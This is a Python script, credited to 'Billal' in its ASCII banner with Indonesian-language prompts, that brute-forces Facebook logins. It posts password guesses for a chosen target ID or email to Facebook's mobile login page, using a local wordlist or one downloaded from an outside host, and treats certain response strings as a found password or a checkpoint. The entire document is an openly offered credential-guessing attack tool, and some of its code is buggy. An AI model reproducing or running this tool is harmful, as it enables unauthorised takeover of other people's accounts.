try:
	import requests,os,sys
	from bs4 import BeautifulSoup as bs
except Exception as E:
	print ("  Warning(ERROR): "+str(E))
	sys.exit()
def brute(id,pw):
	url="https://mbasic.facebook.com/login"
	r=requests.post(url,data={"email":str(id),"pass":str(pw),"login":"submit"}).content
	if "save-device" in str(r) or "m_sess" in str(r) or "home" in str(r):
		print ("  Warning(INFO): (OK) password ditemukan => "+str(pw))
		sys.exit()
	elif "checkpoint" in str(r):
		print ("  Warning(INFO): (CP) passowrd ditemukan => "+str(pw))
		sys.exit()

def banner():
	print ("""
         ╔╗ ┬─┐┬ ┬┌┬┐┌─┐  ╔═╗╔╗ 
         ╠╩╗├┬┘│ │ │ ├┤   ╠╣ ╠╩╗
         ╚═╝┴└─└─┘ ┴ └─┘  ╚  ╚═╝
   {C}odded   : Billal
   {V}ersion  : 0.1
   {G}ithub   : https://github.com/billal1412
================================================
             © 2019 Billal Fauzan
================================================""")
def main():
	banner()
	print ("\n  ID/USERNAME/EMAIL ")
	id=input("    root@brutefb~#> ")
	print ("\n  Wordlist [M]anual [O]tomatis")
	pil=input("    root@brutefb/wordlist#> ")
	if pil in ["M","m"]:
		print ("  File Wordlist ")
		file=input("    root@brutefb/file#> ")
		try:
			op=open(file,"r").readlines()
		except IOError:
			print ("  Warning(ERROR): file tidak ditemukan")
			sys.exit()
		for data in op:
			rep=str(data).replace("\n","")
			print ("  Warning(INFO): mencoba => "+rep)
			brute(id,data)
	elif pil in ["O","o"]:
		print ("  Warning(INFO): downloading wordlist")
		try:
			r=requests.get("https://billal-server.000webhostapp.com/wordlist/password.txt").content
		except r.exceptions.ConnectionError:
			print ("  Warning(ERROR): koneksi error")
			sys.exit()
		open("wordlist.txt","w").write(r)
		w=open("wordlist.txt","r").readlines()
		for data in w:
			print ("  Warning(INFO): mencoba => "+str(data))
			brute(id,data)
	else:
		print ("  Warning(ERROR): pilih W/O")
		sys.exit()
if __name__=="__main__":
	main()
